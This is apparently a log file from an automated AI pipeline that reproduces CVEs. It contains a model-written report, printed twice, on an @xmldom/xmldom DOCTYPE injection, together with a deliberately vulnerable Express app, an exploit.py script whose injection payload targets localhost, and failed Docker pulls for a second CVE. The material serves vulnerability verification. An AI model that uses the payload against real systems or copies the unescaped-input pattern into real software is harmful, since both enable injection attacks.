@@ -1,0 +1,142 @@
+2026-04-25 00:59:56,009 - src.ai_reporter - INFO - APIKeyRotator initialized with 8 keys and 0 proxies.
+/home/lehuuhoang/cve_finding/cve_data_collecting_tool/venv/lib/python3.12/site-packages/vertexai/generative_models/_generative_models.py:433: UserWarning: This feature is deprecated as of June 24, 2025 and will be removed on June 24, 2026. For details, see https://cloud.google.com/vertex-ai/generative-ai/docs/deprecations/genai-vertexai-sdk.
+  warning_logs.show_deprecation_warning()
+2026-04-25 00:59:57,325 - src.agent_verifier - INFO - Starting AGENTIC AI Verifier Worker...
+2026-04-25 01:00:01,687 - src.database - INFO - Database connection pool initialized
+2026-04-25 01:00:02,810 - src.agent_verifier - INFO - ==> Agent Claimed CVE-2026-41674 (Marked LEVEL_1 to release DB Lock). Initializing Hack Process...
+2026-04-25 01:00:02,810 - src.agent_verifier - INFO - [CVE-2026-41674] No PoC JSON found at data/PoC-in-GitHub/2026/CVE-2026-41674.json
+2026-04-25 01:00:02,811 - src.agent_verifier - INFO - [CVE-2026-41674] Agent Iteration 1/5...
+2026-04-25 01:01:08,052 - src.agent_verifier - ERROR - Agent Worker Error: Cannot get the response text.
+Cannot get the Candidate text.
+Multiple content parts are not supported.
+Candidate:
+{
+  "content": {
+    "role": "model",
+    "parts": [
+      {
+        "text": "# CVE-2026-41674 \u2014 @xmldom/xmldom: DOCTYPE Injection during XML Serialization\n\n| Field | Value |\n|---|---|\n| **CVE ID** | CVE-2026-41674 |\n| **Date** | 2026-04-25 |\n| **Verdict** | \u2705 VERIFIED_SUCCESS |\n| **CVSS v3.1** | 8.7 |\n| **CWE** | INJECTION_FLAWS |\n| **Affected** | @xmldom/xmldom |\n\n---\n\n## Why the Vulnerability Exists\nThe vulnerability exists because the `XMLSerializer` component of the `@xmldom/xmldom` package serializes fields of a `DocumentType` node without proper escaping or validation. Specifically, the `internalSubset`, `publicId`, and `systemId` properties are written verbatim into the output string.\n\nAn attacker can provide a specially crafted string to the `createDocumentType` function. For instance, by injecting the sequence `]>` into the `internalSubset` parameter, they can prematurely terminate the `DOCTYPE` declaration. Any content following this sequence is then treated as arbitrary XML markup outside the `DOCTYPE` block, leading to an injection vulnerability.\n\nThe affected serialization logic in `lib/dom.js` demonstrates this flaw:\n\n```js\n// lib/dom.js \u2014 serializer DOCTYPE case\ncase DOCUMENT_TYPE_NODE:\n    // ...\n    if (node.internalSubset) {\n        // The internalSubset is concatenated without any escaping.\n        buf.push(' [', node.internalSubset, ']');\n    }\n    buf.push('>');\n    return;\n```\n\nThis allows an attacker who controls the input to `createDocumentType` to break out of the intended XML structure and inject their own content.\n\n---\n\n## Build Environment\nThe reproduction environment is a Docker container running a simple Node.js web application. The application uses the Express framework to create an HTTP server and a vulnerable version of `@xmldom/xmldom` (`0.8.10`).\n\nThe server exposes a single endpoint, `/generate-xml`, which accepts a `payload` query parameter. This `payload` is used directly as the `internalSubset` when creating a `DocumentType` node. The resulting XML document is then serialized and returned in the HTTP response. The container exposes port 8080 to the host machine, allowing the exploit script to interact with it.\n\n---\n\n## Exploitation \u2014 Step by Step\nThe exploitation process targets the `internalSubset` injection vector to insert an arbitrary XML element into the serialized output.\n\n1.  **Crafting the Payload:** The attacker prepares a payload designed to break out of the `DOCTYPE`'s internal subset. The payload used is `']><injected>EXPLOIT_SUCCESS</injected><"
+      },
+      {
+        "text": "![CDATA['`.\n    *   `]>`: This sequence closes the internal subset (`[...`)"
+      },
+      {
+        "text": " and the `DOCTYPE` declaration itself.\n    *   `<injected>EXPLOIT_SUCCESS</injected>`: This is the arbitrary XML element that the attacker wants to inject into the document root.\n    *   `<"
+      },
+      {
+        "text": "![CDATA[`: This is appended to ensure the rest of the original, intended serialization output is consumed without causing a syntax error.\n\n2.  **Sending the Request:** The `exploit.py` script sends an HTTP GET request to the vulnerable server at `http://localhost:8080/generate-xml`. The crafted payload is URL-encoded and passed as the `payload` query parameter.\n\n3.  **Vulnerable Server Processing:** The Node.js application receives the request. It takes the malicious payload and passes it as the `internalSubset` argument to `impl.createDocumentType()"
+      },
+      {
+        "text": "`.\n\n4.  **Serialization and Injection:** The application then calls `new XMLSerializer().serializeToString(doc)`. The `@xmldom/xmldom` library serializes the `DocumentType` node as follows:\n    *   It starts with `<!DOCTYPE root [`.\n    *   It appends the malicious `internalSubset`: `]><injected>EXPLOIT_SUCCESS</injected><"
+      },
+      {
+        "text": "![CDATA[`.\n    *   It appends the closing `]>`.\n    *   The resulting string becomes: `<!DOCTYPE root []><injected>EXPLOIT_SUCCESS</injected><![CDATA[]><root/>`.\n\n5.  **Verification:** The `exploit.py` script receives the server's response. It checks if the response body contains the string `<injected>EXPLOIT_SUCCESS</injected>`. The presence of this string confirms that the arbitrary XML was successfully injected into the document, bypassing the intended structure. Upon confirmation, the script prints \"EXPLOIT_SUCCESS\".\n\n---\n\n## References\n-   [GHSA-f6ww-3ggp-fr8h (Similar `internalSubset` injection report)"
+      },
+      {
+        "text": "](https://github.com/advisories/GHSA-f6ww-3ggp-fr8h)\n\n===FILE: docker-compose.yml===\nservices:\n  vulnerable-app:\n    build: .\n    ports:\n      - \"8080:8080\"\n===END_FILE===\n===FILE: Dockerfile===\nFROM node:18-alpine\n\nWORKDIR /app\n\nCOPY package.json .\nRUN npm install\n\nCOPY app.js .\n\nEXPOSE 8080\n\nCMD [\"node\", \"app.js\"]\n===END_FILE===\n===FILE: package.json===\n{\n  \"name\": \"vulnerable-app\",\n  \"version\": \"1.0.0\",\n  \"description\": \"Vulnerable app for CVE-2026-41674\",\n  \"main\": \"app.js\",\n  \"scripts\": {\n    \"start\": \"node app.js\"\n  },\n  \"dependencies\": {\n    \"@xmldom/xmldom\": \"0.8.10\",\n    \"express\": \"^4.18.2\"\n  }\n}\n===END_FILE===\n===FILE: app.js===\nconst express = require('express');\nconst { DOMImplementation, XMLSerializer } = require('@xmldom/xmldom');\n\nconst app = express();\nconst port = 8080;\n\napp.get('/generate-xml', (req, res) => {\n  const userInput = req.query.payload || '';\n\n  try {\n    const impl = new DOMImplementation();\n\n    // The user input is used directly as the internalSubset, creating the vulnerability.\n    const doctype = impl.createDocumentType(\n      'root',\n      '',\n      '',\n      userInput\n    );\n\n    const doc = impl.createDocument(null, 'root', doctype);\n    const xml = new XMLSerializer().serializeToString(doc);\n\n    res.setHeader('Content-Type', 'application/xml');\n    res.send(xml);\n  } catch (e) {\n    res.status(500).send(`Error generating XML: ${e.message}`);\n  }\n});\n\napp.listen(port, () => {\n  console.log(`Vulnerable app listening on port ${port}`);\n});\n===END_FILE===\n===FILE: exploit.py===\nimport requests\nimport urllib.parse\n\ndef exploit():\n    \"\"\"\n    Exploits CVE-2026-41674 by injecting a malicious internalSubset payload.\n    \"\"\"\n    target_url = \"http://localhost:8080/generate-xml\"\n\n    # Payload to inject.\n    # `]>` closes the DOCTYPE declaration early.\n    # `<injected>...` is the injected content.\n    # `<"
+      },
+      {
+        "text": "![CDATA[` is used to consume the rest of the generated string gracefully.\n    malicious_payload = \"]><injected>EXPLOIT_SUCCESS</injected><![CDATA[\"\n    \n    injected_tag = \"<injected>EXPLOIT_SUCCESS</injected>\"\n\n    params = {'payload': malicious_payload}\n    \n    print(f\"[*] Sending payload to {target_url}\")"
+      },
+      {
+        "text": "\n\n    try:\n        response = requests.get(target_url, params=params, timeout=5)\n        response.raise_for_status()\n        \n        print(f\"[*] Received response (status {response.status_code}):\")\n        print(response.text)\n\n        if injected_tag in response.text:\n            print(\"\\n[+] Injection successful!\")\n            print(\"EXPLOIT_SUCCESS\")\n        else:\n            print(\"\\n[-] Exploit failed. Injected tag not found in response.\")\n\n    except requests.exceptions.RequestException as e:\n        print(f\"[-] Exploit failed. Could not connect to target: {e}\")\n\nif __name__ == \"__main__\":\n    exploit()\n===END_FILE==="
+      }
+    ]
+  },
+  "finish_reason": "STOP",
+  "avg_logprobs": -0.43114523797939436
+}
+Response:
+{
+  "candidates": [
+    {
+      "content": {
+        "role": "model",
+        "parts": [
+          {
+            "text": "# CVE-2026-41674 \u2014 @xmldom/xmldom: DOCTYPE Injection during XML Serialization\n\n| Field | Value |\n|---|---|\n| **CVE ID** | CVE-2026-41674 |\n| **Date** | 2026-04-25 |\n| **Verdict** | \u2705 VERIFIED_SUCCESS |\n| **CVSS v3.1** | 8.7 |\n| **CWE** | INJECTION_FLAWS |\n| **Affected** | @xmldom/xmldom |\n\n---\n\n## Why the Vulnerability Exists\nThe vulnerability exists because the `XMLSerializer` component of the `@xmldom/xmldom` package serializes fields of a `DocumentType` node without proper escaping or validation. Specifically, the `internalSubset`, `publicId`, and `systemId` properties are written verbatim into the output string.\n\nAn attacker can provide a specially crafted string to the `createDocumentType` function. For instance, by injecting the sequence `]>` into the `internalSubset` parameter, they can prematurely terminate the `DOCTYPE` declaration. Any content following this sequence is then treated as arbitrary XML markup outside the `DOCTYPE` block, leading to an injection vulnerability.\n\nThe affected serialization logic in `lib/dom.js` demonstrates this flaw:\n\n```js\n// lib/dom.js \u2014 serializer DOCTYPE case\ncase DOCUMENT_TYPE_NODE:\n    // ...\n    if (node.internalSubset) {\n        // The internalSubset is concatenated without any escaping.\n        buf.push(' [', node.internalSubset, ']');\n    }\n    buf.push('>');\n    return;\n```\n\nThis allows an attacker who controls the input to `createDocumentType` to break out of the intended XML structure and inject their own content.\n\n---\n\n## Build Environment\nThe reproduction environment is a Docker container running a simple Node.js web application. The application uses the Express framework to create an HTTP server and a vulnerable version of `@xmldom/xmldom` (`0.8.10`).\n\nThe server exposes a single endpoint, `/generate-xml`, which accepts a `payload` query parameter. This `payload` is used directly as the `internalSubset` when creating a `DocumentType` node. The resulting XML document is then serialized and returned in the HTTP response. The container exposes port 8080 to the host machine, allowing the exploit script to interact with it.\n\n---\n\n## Exploitation \u2014 Step by Step\nThe exploitation process targets the `internalSubset` injection vector to insert an arbitrary XML element into the serialized output.\n\n1.  **Crafting the Payload:** The attacker prepares a payload designed to break out of the `DOCTYPE`'s internal subset. The payload used is `']><injected>EXPLOIT_SUCCESS</injected><"
+          },
+          {
+            "text": "![CDATA['`.\n    *   `]>`: This sequence closes the internal subset (`[...`)"
+          },
+          {
+            "text": " and the `DOCTYPE` declaration itself.\n    *   `<injected>EXPLOIT_SUCCESS</injected>`: This is the arbitrary XML element that the attacker wants to inject into the document root.\n    *   `<"
+          },
+          {
+            "text": "![CDATA[`: This is appended to ensure the rest of the original, intended serialization output is consumed without causing a syntax error.\n\n2.  **Sending the Request:** The `exploit.py` script sends an HTTP GET request to the vulnerable server at `http://localhost:8080/generate-xml`. The crafted payload is URL-encoded and passed as the `payload` query parameter.\n\n3.  **Vulnerable Server Processing:** The Node.js application receives the request. It takes the malicious payload and passes it as the `internalSubset` argument to `impl.createDocumentType()"
+          },
+          {
+            "text": "`.\n\n4.  **Serialization and Injection:** The application then calls `new XMLSerializer().serializeToString(doc)`. The `@xmldom/xmldom` library serializes the `DocumentType` node as follows:\n    *   It starts with `<!DOCTYPE root [`.\n    *   It appends the malicious `internalSubset`: `]><injected>EXPLOIT_SUCCESS</injected><"
+          },
+          {
+            "text": "![CDATA[`.\n    *   It appends the closing `]>`.\n    *   The resulting string becomes: `<!DOCTYPE root []><injected>EXPLOIT_SUCCESS</injected><![CDATA[]><root/>`.\n\n5.  **Verification:** The `exploit.py` script receives the server's response. It checks if the response body contains the string `<injected>EXPLOIT_SUCCESS</injected>`. The presence of this string confirms that the arbitrary XML was successfully injected into the document, bypassing the intended structure. Upon confirmation, the script prints \"EXPLOIT_SUCCESS\".\n\n---\n\n## References\n-   [GHSA-f6ww-3ggp-fr8h (Similar `internalSubset` injection report)"
+          },
+          {
+            "text": "](https://github.com/advisories/GHSA-f6ww-3ggp-fr8h)\n\n===FILE: docker-compose.yml===\nservices:\n  vulnerable-app:\n    build: .\n    ports:\n      - \"8080:8080\"\n===END_FILE===\n===FILE: Dockerfile===\nFROM node:18-alpine\n\nWORKDIR /app\n\nCOPY package.json .\nRUN npm install\n\nCOPY app.js .\n\nEXPOSE 8080\n\nCMD [\"node\", \"app.js\"]\n===END_FILE===\n===FILE: package.json===\n{\n  \"name\": \"vulnerable-app\",\n  \"version\": \"1.0.0\",\n  \"description\": \"Vulnerable app for CVE-2026-41674\",\n  \"main\": \"app.js\",\n  \"scripts\": {\n    \"start\": \"node app.js\"\n  },\n  \"dependencies\": {\n    \"@xmldom/xmldom\": \"0.8.10\",\n    \"express\": \"^4.18.2\"\n  }\n}\n===END_FILE===\n===FILE: app.js===\nconst express = require('express');\nconst { DOMImplementation, XMLSerializer } = require('@xmldom/xmldom');\n\nconst app = express();\nconst port = 8080;\n\napp.get('/generate-xml', (req, res) => {\n  const userInput = req.query.payload || '';\n\n  try {\n    const impl = new DOMImplementation();\n\n    // The user input is used directly as the internalSubset, creating the vulnerability.\n    const doctype = impl.createDocumentType(\n      'root',\n      '',\n      '',\n      userInput\n    );\n\n    const doc = impl.createDocument(null, 'root', doctype);\n    const xml = new XMLSerializer().serializeToString(doc);\n\n    res.setHeader('Content-Type', 'application/xml');\n    res.send(xml);\n  } catch (e) {\n    res.status(500).send(`Error generating XML: ${e.message}`);\n  }\n});\n\napp.listen(port, () => {\n  console.log(`Vulnerable app listening on port ${port}`);\n});\n===END_FILE===\n===FILE: exploit.py===\nimport requests\nimport urllib.parse\n\ndef exploit():\n    \"\"\"\n    Exploits CVE-2026-41674 by injecting a malicious internalSubset payload.\n    \"\"\"\n    target_url = \"http://localhost:8080/generate-xml\"\n\n    # Payload to inject.\n    # `]>` closes the DOCTYPE declaration early.\n    # `<injected>...` is the injected content.\n    # `<"
+          },
+          {
+            "text": "![CDATA[` is used to consume the rest of the generated string gracefully.\n    malicious_payload = \"]><injected>EXPLOIT_SUCCESS</injected><![CDATA[\"\n    \n    injected_tag = \"<injected>EXPLOIT_SUCCESS</injected>\"\n\n    params = {'payload': malicious_payload}\n    \n    print(f\"[*] Sending payload to {target_url}\")"
+          },
+          {
+            "text": "\n\n    try:\n        response = requests.get(target_url, params=params, timeout=5)\n        response.raise_for_status()\n        \n        print(f\"[*] Received response (status {response.status_code}):\")\n        print(response.text)\n\n        if injected_tag in response.text:\n            print(\"\\n[+] Injection successful!\")\n            print(\"EXPLOIT_SUCCESS\")\n        else:\n            print(\"\\n[-] Exploit failed. Injected tag not found in response.\")\n\n    except requests.exceptions.RequestException as e:\n        print(f\"[-] Exploit failed. Could not connect to target: {e}\")\n\nif __name__ == \"__main__\":\n    exploit()\n===END_FILE==="
+          }
+        ]
+      },
+      "finish_reason": "STOP",
+      "avg_logprobs": -0.43114523797939436
+    }
+  ],
+  "usage_metadata": {
+    "prompt_token_count": 2987,
+    "candidates_token_count": 1967,
+    "total_token_count": 8355,
+    "prompt_tokens_details": [
+      {
+        "modality": "TEXT",
+        "token_count": 2987
+      }
+    ],
+    "candidates_tokens_details": [
+      {
+        "modality": "TEXT",
+        "token_count": 1967
+      }
+    ],
+    "thoughts_token_count": 3401
+  },
+  "model_version": "gemini-2.5-pro",
+  "create_time": "2026-04-24T18:00:25.584942Z",
+  "response_id": "ua_rae7ZI4GAtrIPrM-rkAI"
+}
+2026-04-25 01:01:19,017 - src.agent_verifier - INFO - ==> Agent Claimed CVE-2026-41641 (Marked LEVEL_1 to release DB Lock). Initializing Hack Process...
+2026-04-25 01:01:19,019 - src.agent_verifier - INFO - [CVE-2026-41641] No PoC JSON found at data/PoC-in-GitHub/2026/CVE-2026-41641.json
+2026-04-25 01:01:19,019 - src.agent_verifier - INFO - [CVE-2026-41641] Agent Iteration 1/5...
+2026-04-25 01:02:10,544 - src.agent_verifier - INFO - [CVE-2026-41641] Using Docker Compose Up...
+2026-04-25 01:02:19,284 - src.agent_verifier - WARNING - [CVE-2026-41641] Iteration 1 Failed! Error:
+2026-04-25 01:02:19,284 - src.agent_verifier - WARNING - [CVE-2026-41641] DOCKER COMPOSE UP FAILED:\nuhoang/cve_finding/cve_data_collecting_tool/tmp/CVE-2026-41641/docker-compose.yml: the attribute `version` is obsolete, it will be ignored, please remove it to avoid potential confusion"
+ app Pulling 
+ app Error failed to resolve reference "docker.io/nocobase/nocobase:0.20.3-postgres": docker.io/nocobase/nocobase:0.20.3-postgres: not found
+Error response from daemon: failed to resolve reference "docker.io/nocobase/nocobase:0.20.3-postgres": docker.io/nocobase/nocobase:0.20.3-postgres: not found
+\n\nCONTAINER LOGS:\n
+2026-04-25 01:02:19,284 - src.agent_verifier - INFO - [CVE-2026-41641] Agent Iteration 2/5...
+2026-04-25 01:02:59,780 - src.agent_verifier - INFO - [CVE-2026-41641] Using Docker Compose Up...
+2026-04-25 01:03:06,779 - src.agent_verifier - WARNING - [CVE-2026-41641] Iteration 2 Failed! Error:
+2026-04-25 01:03:06,780 - src.agent_verifier - WARNING - [CVE-2026-41641] DOCKER COMPOSE UP FAILED:\n app Pulling 
+ app Error failed to resolve reference "docker.io/nocobase/nocobase:0.16.1-postgres": docker.io/nocobase/nocobase:0.16.1-postgres: not found
+Error response from daemon: failed to resolve reference "docker.io/nocobase/nocobase:0.16.1-postgres": docker.io/nocobase/nocobase:0.16.1-postgres: not found
+\n\nCONTAINER LOGS:\n
+2026-04-25 01:03:06,780 - src.agent_verifier - INFO - [CVE-2026-41641] Agent Iteration 3/5...
+2026-04-25 01:03:48,661 - src.agent_verifier - INFO - [CVE-2026-41641] Using Docker Compose Up...
+2026-04-25 01:04:14,110 - src.agent_verifier - WARNING - [CVE-2026-41641] Iteration 3 Failed! Error:
+2026-04-25 01:04:14,129 - src.agent_verifier - WARNING - [CVE-2026-41641] DOCKER COMPOSE UP FAILED:\n app Pulling 
+ app Error failed to resolve reference "docker.io/nocobase/nocobase:0.15.0-alpha.10-postgres": docker.io/nocobase/nocobase:0.15.0-alpha.10-postgres: not found
+Error response from daemon: failed to resolve reference "docker.io/nocobase/nocobase:0.15.0-alpha.10-postgres": docker.io/nocobase/nocobase:0.15.0-alpha.10-postgres: not found
+\n\nCONTAINER LOGS:\n
+2026-04-25 01:04:14,129 - src.agent_verifier - INFO - [CVE-2026-41641] Agent Iteration 4/5...
+2026-04-25 01:04:40,182 - src.agent_verifier - INFO - [CVE-2026-41641] Using Docker Compose Up...
+2026-04-25 01:04:51,611 - src.agent_verifier - WARNING - [CVE-2026-41641] Iteration 4 Failed! Error:
+2026-04-25 01:04:51,611 - src.agent_verifier - WARNING - [CVE-2026-41641] DOCKER COMPOSE UP FAILED:\n app Pulling 
+ app Error failed to resolve reference "docker.io/nocobase/nocobase:0.14.3-postgres": docker.io/nocobase/nocobase:0.14.3-postgres: not found
+Error response from daemon: failed to resolve reference "docker.io/nocobase/nocobase:0.14.3-postgres": docker.io/nocobase/nocobase:0.14.3-postgres: not found
+\n\nCONTAINER LOGS:\n
+2026-04-25 01:04:51,611 - src.agent_verifier - INFO - [CVE-2026-41641] Agent Iteration 5/5...
